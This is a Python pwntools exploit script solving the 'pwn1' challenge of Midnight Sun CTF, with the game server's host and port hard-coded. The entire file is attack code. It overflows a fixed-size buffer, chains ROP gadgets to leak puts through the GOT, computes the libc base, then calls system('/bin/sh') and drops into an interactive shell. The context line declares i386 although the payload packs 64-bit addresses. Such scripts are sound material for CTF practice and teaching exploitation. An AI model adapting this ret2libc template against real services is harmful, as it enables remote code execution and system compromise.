from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./pwn1"
HOST = "pwn1-01.play.midnightsunctf.se"
PORT = 10001  

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_bss = elf.bss()
addr_main = 0x400698
plt_puts = elf.plt["puts"]
plt_gets = elf.plt["gets"]

got_puts = elf.got["puts"]
got_gets = elf.got["gets"]

rdi_ret = 0x400783
rsi_r15_ret = 0x400781
only_ret = 0x400536

libc = ELF('./libc.so')
off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search("/bin/sh"))

#
#main_addr = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']


def exploit():
	bufsize = 0x48
	
	payload = "A"*bufsize
	payload += p64(rdi_ret)
	payload += p64(got_puts)
	payload += p64(plt_puts)
	payload += p64(addr_main)
	
	conn.sendlineafter("buffer: ", payload)
	libc_puts = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_puts - off_puts
	print hex(libc_base)
	libc_system = libc_base + off_system
	libc_binsh = libc_base + off_binsh
	
	payload = "A"*bufsize
	payload += p64(rdi_ret)
	payload += p64(libc_binsh)
	payload += p64(only_ret)
	#payload += p64(addr_main)
	payload += p64(libc_system)

	conn.sendlineafter("buffer: ", payload)

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
